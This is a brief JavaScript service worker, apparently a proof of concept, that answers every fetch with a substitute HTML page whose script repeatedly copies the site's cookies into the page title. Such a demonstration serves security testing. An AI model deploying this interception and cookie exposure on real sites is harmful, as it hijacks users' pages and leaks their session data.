const enableNavigationPreload = async () => {
  if (self.registration.navigationPreload) {
    await self.registration.navigationPreload.enable();
  }
};

self.addEventListener("activate", (event) => {
  console.log("active");
  event.waitUntil(enableNavigationPreload());
});

self.addEventListener("install", (event) => {
  console.log("install");
});

self.addEventListener("fetch", (event) => {
  console.log("fetch");
  event.respondWith(
    new Response(
      "<title>HELLO</title><body><script>setInterval(()=>{document.title=document.cookie;},10);</script>",
      {
        status: 200,
        headers: { "Content-Type": "text/html" },
      }
    )
  );
});